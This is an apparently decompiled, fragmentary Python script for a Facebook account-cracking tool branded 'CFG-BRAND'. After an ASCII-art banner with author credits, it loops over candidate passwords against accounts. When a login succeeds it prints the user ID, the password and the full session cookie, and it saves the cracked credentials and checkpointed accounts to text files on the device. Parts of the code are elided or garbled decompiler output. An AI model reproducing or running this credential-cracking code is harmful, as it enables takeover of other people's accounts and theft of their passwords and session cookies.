...
def o():
    ...
    if None == '2':
        ...
        return None
    if None == '3':
        os.system('xdg-open 03435908309')
        return None
    if None == '4':
        os.system('xdg-open https://youtube.com/channel/UC7VzQau0F-tsOkRcksAmmxw/')
        return None
...
today = date.today()
logo =                                          ("""   
\033[1;32m   _____   ______    _____ 
\033[1;35m  / ____| |  ____|  / ____|
\033[1;35m | |      | |__    | |  __ 
\033[1;32m  | |      |  __|   | | |_ |
\033[1;32m | |____  | |      | |__| |
\033[1;35m  \_____| |_|       \_____|
--------------------------------------------------------------------------------------------------------------------------------------------
\033[1;37m================= \33[32;45mCFG-BRAND\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mJHALLA\33[0;m\033[1;32m 🔥 \033[1;33m\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m ABU BAKAR
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mJHALLA11
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mGCU UNITY
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2
\033[1;37m================= \33[32;45mCFG-BRAND\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO CFG-BRAND TOOL\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('    \033[1;32m(JHALLA~CFG-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/JHALLA~CFG-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[24:39]
                print('    \33[1;30m(JHALLA~CFG-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/JHALLA~CFG-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[JHALLA~CFG] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
